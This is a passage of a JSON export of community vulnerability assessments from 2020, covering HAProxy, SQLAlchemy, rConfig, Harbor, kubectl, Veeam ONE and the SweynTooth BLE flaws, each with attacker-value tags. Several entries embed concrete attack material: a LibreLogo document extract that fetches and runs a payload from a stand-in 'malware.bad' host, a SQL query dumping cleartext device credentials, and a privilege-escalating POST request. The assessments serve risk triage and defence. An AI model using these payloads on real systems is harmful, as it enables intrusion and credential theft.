        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "36217e96-2a56-4f53-9ba4-7cf15b0e26bd",
      "editorId": "7dcb2bba-0893-4a4b-a2c9-152965f852b9",
      "topicId": "f1080147-f670-4841-8bd9-6c5b9fc776da",
      "created": "2020-04-22T17:12:14.773236Z",
      "revisionDate": "2020-04-25T00:12:55.518219Z",
      "document": "**Update April 24, 2020**\r\n\r\nTurns out, Apple and HD are both of the opinion that the vulnerability doesn't exist. See the reporting at Ars:\r\n\r\nhttps://arstechnica.com/information-technology/2020/04/apple-disputes-report-of-non-click-ios-0day-under-exploit-for-two-years/\r\n\r\nWhat's the lesson here? PoC||GTFO, and let the vendors do their jobs as part of coordinated vulnerability disclosure. Updating the high-value/low-value indicators here.\r\n\r\n**Original Report Below**\r\n\r\nIt technically \"requires user interaction\" but that interaction is merely opening a malicious email. It doesn't sound like you need to click on anything.\r\n\r\nAccording to the report, Apple has confirmed the existence, but we haven't seen a patch or a CVE or anything like that.\r\n\r\nThis is super-duper high value, IMO. Million dollar bug. Own any-ish iPhone, assuming they're using Mail.app, which most are (there are 3rd party email applications, like Gmail and Yahoo! Mail, but they are somewhat rare in the iPhone / iPad ecosystem).",
      "score": 6,
      "metadata": {
        "tags": [
          "pre_auth",
          "requires_interaction",
          "no_useful_data",
          "difficult_to_develop"
        ],
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "3213730e-6297-4f1d-a424-ad8b38307aae",
      "editorId": "5e2d2d72-4160-4c96-9014-119b14a0ee5c",
      "topicId": "c5cc4a41-b317-4a5b-9310-c01a4499bc3c",
      "created": "2020-04-23T13:18:28.96003Z",
      "revisionDate": "2020-04-23T13:18:28.964564Z",
      "document": "This vulnerability affects HAProxy and does not require prior authentication as indicated by the CVSS score. Hopefully there is an update to the CVSS.\r\n\r\nThis vulnerability allows RCE when HTTP2 is enabled on HAProxy. There is a PoC exploit created by the researcher who discovered the vulnerability.\r\n\r\n**Note that in some solutions HTTP2 on HAProxy may be enabled by default.**\r\n\r\n\r\nTo defend against this vulnerability:\r\n\r\n- HAproxy patches can be applied.\r\n- As workaroud you can disable HTTP2.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "pre_auth",
          "obscure_configuration"
        ],
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "1001d04a-24e7-499b-b92c-51a4afe1a03e",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "0a2a5ba5-e17c-4bed-a99f-309d1366d97a",
      "created": "2020-04-23T20:22:24.86806Z",
      "revisionDate": "2020-04-23T20:22:24.872595Z",
      "document": "This forms the basis of a social engineering attack, It requires libre office and python installed. This means it is a limited pool of targe victims. However this is a common setup on Linux desktop environments which may make developers a target. \r\n\r\nTo exploit this vulnerability, an attacker creates a document with a text-written command and a hyperlink that, upon user mouseover, runs a program through the LibreLogo extension. When a user loads up the document in a program such as LibreOffice Writer, the macro is enabled automatically. \r\n\r\nThe hyperlink is set to include the macro LibreLogo:run. This in turn runs the previous text command through LibreLogo as if it's attempting to use the information to create turtle vector graphics. This causes whatever is being called in the text command to run \u2013 be it malware, a program, or a malicious file download.\r\n\r\nAn example extract from an odt file can be seen below\r\n\r\n```\r\n   <txt ptr=\"0x4e9a180\" id=\"3\" symbol=\"11SwTextFrame\" next=\"10\" upper=\"2\" txtNodeIndex=\"9\">\r\n    <infos>\r\n     <bounds left=\"8181\" top=\"1418\" width=\"9638\" height=\"299\" mbFixSize=\"false\" mbValidPos=\"true\" mbValidSize=\"true\" mbValidPrtArea=\"true\"/>\r\n     <prtBounds left=\"0\" top=\"0\" width=\"9638\" height=\"299\"/>\r\n    </infos>\r\nimport os    <Text nLength=\"9\" nType=\"POR_PARA\" nHeight=\"299\" nWidth=\"989\" Portion=\"import os\"/>\r\n    <LineBreak nWidth=\"989\" Line=\"import os\"/>\r\n    <Finish/>\r\n   </txt>\r\n   <txt ptr=\"0x7c6e450\" id=\"10\" symbol=\"11SwTextFrame\" next=\"15\" prev=\"3\" upper=\"2\" txtNodeIndex=\"10\">\r\n    <infos>\r\n     <bounds left=\"8181\" top=\"1717\" width=\"9638\" height=\"598\" mbFixSize=\"false\" mbValidPos=\"true\" mbValidSize=\"true\" mbValidPrtArea=\"true\"/>\r\n     <prtBounds left=\"0\" top=\"0\" width=\"9638\" height=\"598\"/>\r\n    </infos>\r\nos.system(\u201cwget http://immersivemalware.bad:8001/payload.sh ; chmod +x payload.sh ; ./payload.sh\u201d)    <Text nLength=\"84\" nType=\"POR_PARA\" nHeight=\"299\" nWidth=\"9264\" Portion=\"os.system(&#x201C;wget http://malware.bad:8001/payload.sh ; chmod +x payload.sh ; \"/>\r\n    <LineBreak nWidth=\"9264\" Line=\"os.system(&#x201C;wget http://malware.bad:8001/payload.sh ; chmod +x payload.sh ; \"/>\r\n    <Text nLength=\"14\" nType=\"POR_LAY\" nHeight=\"299\" nWidth=\"1458\" Portion=\"./payload.sh&#x201D;)\"/>\r\n    <LineBreak nWidth=\"1458\" Line=\"./payload.sh&#x201D;)\"/>\r\n    <Finish/>\r\n   </txt>\r\n   <txt ptr=\"0x4e2ac00\" id=\"15\" symbol=\"11SwTextFrame\" prev=\"10\" upper=\"2\" txtNodeIndex=\"11\">\r\n    <infos>\r\n     <bounds left=\"8181\" top=\"2315\" width=\"9638\" height=\"299\" mbFixSize=\"false\" mbValidPos=\"true\" mbValidSize=\"true\" mbValidPrtArea=\"true\"/>\r\n     <prtBounds left=\"0\" top=\"0\" width=\"9638\" height=\"299\"/>\r\n    </infos>\r\nRun    <Text nLength=\"3\" nType=\"POR_PARA\" nHeight=\"299\" nWidth=\"434\" Portion=\"Run\"/>\r\n    <LineBreak nWidth=\"434\" Line=\"Run\"/>\r\n    <Finish/>\r\n   </txt>\r\n```",
      "score": 1,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "requires_interaction"
        ],
        "attacker-value": 1,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "5623f840-df7b-4cad-a2cd-e154db29dc53",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "21e9b361-f38e-4b8e-bb46-e845fcb352c5",
      "created": "2020-04-23T20:30:09.149362Z",
      "revisionDate": "2020-04-23T20:30:09.153011Z",
      "document": "SQLAlchemy is one of the most popular ORMs for Python / SQL Database interaction. It is heavily used in python web applications with frameworks like Flask and Django. \r\n\r\nORMS are heavily used as they prevent the need for raw queries, which also adds input sanitization as part of its process. \r\n\r\nThis specific exploit would allow SQL Injection if an attacker can control the input sent to group_by as this field was not being filtered. This could resutl in full DB compromise including the compromise of credentials. \r\n\r\nWhilst the use of SQLAlchemy is fairly common the specific requirements around the version and the group_by parameter being accessible to an end-user may not be as common. ",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "high_privilege_access"
        ],
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "29b2ea6f-8caf-435a-86ec-8837065b7535",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "0a5b2dc4-5eff-454f-940a-e556f9d5e4c3",
      "created": "2020-04-23T20:43:29.967181Z",
      "revisionDate": "2020-04-23T20:43:29.972382Z",
      "document": "rConfig reports almost 3.5 million devices managed by this utility. A search of Shodan reveals there are several dozen instances exposed directly to the internet on a vulnerable version. \r\n\r\nThis exploit allows RCE on the host. If you can gain host access you can read the database keys in `./config/config.inc.php` and then access the database.  \r\n\r\nBy design the database contains the details for all of your network devices. It also contains clear text credentials for access to these devices. \r\n\r\n```sql\r\nMariaDB [rconfig]> select deviceUsername, deviceName, devicePassword, deviceEnablePassword, deviceIpAddr from nodes;\r\n\r\n+----------------+------------+----------------+----------------------+--------------+\r\n\r\n| deviceUsername | deviceName | devicePassword | deviceEnablePassword | deviceIpAddr |\r\n\r\n+----------------+------------+----------------+----------------------+--------------+\r\n\r\n| admin          | Primary    | password       | password             | 10.10.10.10  |\r\n\r\n+----------------+------------+----------------+----------------------+--------------+\r\n\r\n1 row in set (0.00 sec)\r\n\r\n\r\n\r\nMariaDB [rconfig]> \r\n```\r\n\r\nThis then permits any attacker to gain access to a wide range of internal network devices.\r\nAs rConfig is typically seen to access these devices it is easy for an attacker to hide amongst the background noise. \r\n\r\n",
      "score": 1,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop",
          "common_enterprise"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "ebe14cdc-e8fc-4c94-8934-6382bf7c3c3a",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "2877110a-f327-4154-b22d-44d58df56ac5",
      "created": "2020-04-23T20:52:58.895781Z",
      "revisionDate": "2020-04-23T20:52:58.900964Z",
      "document": "There are three specific requirements for an application to be vulnerable:\r\n\r\n- Vulnerable version !\r\n- Using a Database for storage\r\n- Self Registration enabled. \r\n\r\nSelf-registration is not a very common setting but it has been seen. \r\n\r\nIf you are able to register your own account it is trivial to modify a POST request and elevate yourself to admin permissions. \r\n\r\n```\r\nPOST /api/users HTTP/1.1\r\nHost: 10.102.7.190\r\nContent-Type: application/json\r\nContent-Length: 95\r\nConnection: close\r\n\r\n\r\n{\"username\":\"Tom\",\"email\":\"Tom@demo.local\",\"realname\":\"Tom\",\"password\":\"Password1\",\"comment\":null, \"has_admin_role\":\"true\"}\r\n```\r\n\r\nIf you have access to the repository as an admin you can manipulate the containers and even gain further access in to the network if you can read and or modify any of the cotanienrs or their secrets. ",
      "score": 1,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "obscure_configuration",
          "post_auth",
          "common_enterprise"
        ],
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "684b4e21-7b6e-40d7-93c7-e1c1cfca13bf",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "c6953e35-2936-4a2e-b35b-226a4e42d556",
      "created": "2020-04-23T20:59:18.824266Z",
      "revisionDate": "2020-04-23T20:59:18.828934Z",
      "document": "There are a lot of moving parts to be able to exploit this. But if successful will give an attacker a container escape on to the kube host. \r\nAn attacker must already have shell access to a container and there must be a process running from the host that uses the kubectl cp command. \r\nThis is *occasionally* seen used to copy files like log files out of a container to the host for backup or additional processing. \r\n\r\nIf a user can replace the tar binary in the container it is possible to perform actions like editing the .bashrc file on the host. This could be used to create new SSH accounts, or establish a reverse shell as that user. Typically with root permissions. \r\n\r\n",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "high_privilege_access",
          "difficult_to_develop",
          "post_auth"
        ],
        "attacker-value": 4,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "9cf9e1e9-88eb-4303-85ba-ba6f2c6260c6",
      "editorId": "239a8bee-6464-4a18-9335-6787b97689b3",
      "topicId": "8a856baf-d6e1-4ad7-8da1-11da96b09e67",
      "created": "2020-04-23T21:30:35.370258Z",
      "revisionDate": "2020-04-26T22:58:41.317892Z",
      "document": "This vuln is part of a related batch named **SweynTooth** from researchers at the Singapore University of Technology and Design.  The SweynTooth vulnerabilities lie within certain Bluetooth Low Energy (BLE) SDKs for Systems-on-a-Chip (SoC), which can make proliferating fixes to affected devices in the field a slow going.\r\n\r\nVulnerable devices need to be within BLE radio range in order for an attacker to target.  A successful exploit can leave the target in a deadlocked state (in this case, stuck in the 'idle' state), triggered by sending the vulnerable device either a truncated connection request OR a connection request with invalid 'interval' or 'timeout' values of 0.  While the condition of being stuck in the 'idle' state should be handled by the application layer (and transitioned to another state), not all devices correctly do so (at least one instance of 'example code' provided with the SDK did not handle this condition).  In their testing, researchers were able to deadlock a [eGeeTounch smart luggage lock](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-4002r2) containing this vulnerability, requiring a powercycle to resume normal operation.  A detailed explanation can be found [here](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-140006.5) in the original disclosure.  It appears the SoC manufacturer has [issued fixes](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-6001r5) for their vulnerable SDK(s).\r\n\r\nEDIT: Attacker Value for this item largely depends on the type of device the vulnerable target is and behavior the device exhibits when successfully exploited.",
      "score": 1,
      "metadata": {
        "tags": [
          "no_useful_data",
          "difficult_to_patch",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "430b58bc-6eff-4289-b4db-8f9561380b37",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "22b16988-9cb8-41a7-a203-e0236f8b5835",
      "created": "2020-04-24T12:22:25.732236Z",
      "revisionDate": "2020-05-05T14:46:34.543831Z",
      "document": "Veeam is a popular provider of enterprise backup solutions. The Veeam ONE Agent, which also runs on the ONE solution's server, is vulnerable to [pre-auth RCE through .NET deserialization](https://www.veeam.com/kb3144).\r\n\r\nThis would be a valuable target if found, since backups can often contain sensitive information, not to mention the possibility of \"poisoning\" them for persistence. Additionally, since this is RCE in the agent, which runs on both the server and its managed hosts, there is potential for widespread exploitation, at least on an internal network, possibly even corporate laptops out in the world - but I don't want to speculate too much. :-)\r\n\r\nI couldn't find any analyses or PoCs, so I did a little patch analysis and came up with an [exploit](https://github.com/rapid7/metasploit-framework/pull/13327) for this particular CVE. The patches are shown below.\r\n\r\n# [CVE-2020-10914](https://nvd.nist.gov/vuln/detail/CVE-2020-10914) / [ZDI-20-545](https://www.zerodayinitiative.com/advisories/ZDI-20-545/)\r\n\r\n![](https://i.imgur.com/L5oUKAg.png)\r\n\r\n`PerformHandshake()` patch\r\n\r\n# [CVE-2020-10915](https://nvd.nist.gov/vuln/detail/CVE-2020-10915) / [ZDI-20-546](https://www.zerodayinitiative.com/advisories/ZDI-20-546/)\r\n\r\n![](https://i.imgur.com/fdRrZrF.png)\r\n\r\n`HandshakeResult()` patch\r\n\r\nHere's the other CVE on AKB: https://attackerkb.com/topics/XGLYmubkSs/cve-2020-10914. I haven't done anything with it yet, but I can hit the code path. I targeted `HandshakeResult()` because it seemed more straightforward to trigger a failure in the handshake.",
      "score": 3,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "pre_auth",
          "common_enterprise",
          "default_configuration"
        ],
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "df051455-a0a5-4aa2-81b3-38af9a316839",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "70d99467-5049-4e01-90e1-892a52f965a7",
      "created": "2020-04-24T14:12:51.796746Z",
      "revisionDate": "2020-04-24T14:12:51.800367Z",
      "document": "I wrote an assessment on the [other CVE](https://attackerkb.com/assessments/430b58bc-6eff-4289-b4db-8f9561380b37).",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "f07a627a-e0bc-437b-beb3-a9017039a8b6",
      "editorId": "543c770b-f33d-48d0-aed7-3a2525de4ba4",
      "topicId": "f1080147-f670-4841-8bd9-6c5b9fc776da",
      "created": "2020-04-24T16:56:05.23178Z",
      "revisionDate": "2020-04-24T17:38:53.858064Z",
      "document": "https://blog.zecops.com/vulnerabilities/youve-got-0-click-mail/",
      "score": 0,
      "metadata": {
        "tags": [
          "common_enterprise",
          "easy_to_develop",
          "pre_auth",
          "high_privilege_access",
          "default_configuration"
        ]
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "e1aac60e-c3eb-4986-b7e9-4f64970b28a9",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "4d0c4c5f-a938-4dc3-970f-f163624e08cc",
      "created": "2020-04-24T22:02:27.625518Z",
      "revisionDate": "2020-05-05T12:18:39.236693Z",
      "document": "An out of bounds dereference exists within the kernel-mode function `win32kfull!vStrWrite01` that can be triggered from user-mode by calling `gdi32!StretchBlt` with a specially sized canvas and a specific raster operation (`SRCERASE`).\r\n\r\n```python\r\nStretchBlt(hdc, 0x0, 0x2, 0x100, 0x1, hdc, 0x0, 0x0, 0x400, 0x8000, SRCERASE)\r\n```\r\n\r\nThe vulnerability could be leveraged as an information leak. \r\n",
      "score": 2,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "difficult_to_develop",
          "common_enterprise",
          "default_configuration"
        ],
        "attacker-value": 2,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "5c6de085-17c6-48f7-be7a-226870cc7890",
      "editorId": "239a8bee-6464-4a18-9335-6787b97689b3",
      "topicId": "1bf89520-5879-4e4e-b3e6-828130a0586c",
      "created": "2020-04-25T19:37:30.045503Z",
      "revisionDate": "2020-04-26T22:58:23.687853Z",
      "document": "This vuln is part of a related batch named **SweynTooth** from researchers at the Singapore University of Technology and Design.  The SweynTooth vulnerabilities lie within certain Bluetooth Low Energy (BLE) SDKs for Systems-on-a-Chip (SoC), which can make proliferating fixes to affected devices in the field a slow going.\r\n\r\nVulnerable devices need to be within BLE radio range in order for an attacker to target.  A successful exploit can leave the target in a crashed state or force a restart, triggered by sending the vulnerable device packets with very large Link Layer Length (LL Length) values which eventually results in a Buffer Overflow (BOF) condition.  In their testing, researchers were able to trigger a crash->restart on an [Eve Energy smart plug](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-4002r2) containing this vulnerability, triggering power interruption to whatever is plugged into the vulnerable plug due to the target's logic keeping AC power off while the device is starting up.  Researchers also tested against an [August Smart Lock](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-4002r2), which uses the same SoC and contains the same vulnerability.  A detailed explanation can be found [here](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-130006.4) in the original disclosure, as well as some potentially vulnerable devices in [this list](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-5002r4).  Due to the nature of the vulnerability being a BOF leaves the door open for further exploration to potentially gain code execution on a vulnerable target.  It appears the SoC manufacturer has [issued some fixes](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-6001r5) for their vulnerable SDK(s).\r\n\r\nEDIT: Attacker Value for this item largely depends on the type of device the vulnerable target is and behavior the device exhibits when successfully exploited.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "difficult_to_patch",
          "pre_auth",
          "no_useful_data"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "dab3c804-4909-4533-a305-027e0f3eb709",
      "editorId": "239a8bee-6464-4a18-9335-6787b97689b3",
      "topicId": "26308344-a0ca-44b1-b360-e0aedbd3ca3c",
      "created": "2020-04-25T19:47:36.809029Z",
      "revisionDate": "2020-04-26T22:58:07.638306Z",
      "document": "This vuln is part of a related batch named **SweynTooth** from researchers at the Singapore University of Technology and Design.  The SweynTooth vulnerabilities lie within certain Bluetooth Low Energy (BLE) SDKs for Systems-on-a-Chip (SoC), which can make proliferating fixes to affected devices in the field a slow going.\r\n\r\nVulnerable devices need to be within BLE radio range in order for an attacker to target.  A successful exploit can leave the target in a crashed state or force a restart, triggered by sending the vulnerable device Logical Link Control and Adaptation Layer Protocol (L2CAP) packets containing a Link Layer Length (LL Length) value less than L2CAP Length + 4, resulting in a Buffer Overflow (BOF) condition on the target.  A detailed explanation can be found [here](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-120006.3) in the original disclosure, as well as some potentially vulnerable devices in [this list](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-5002r4).  Due to the nature of the vulnerability being a BOF leaves the door open for further exploration to potentially gain code execution on a vulnerable target.  It appears the SoC manufacturer has [issued some fixes](https://asset-group.github.io/disclosures/sweyntooth/disclosure.html#x1-6001r5) for their vulnerable 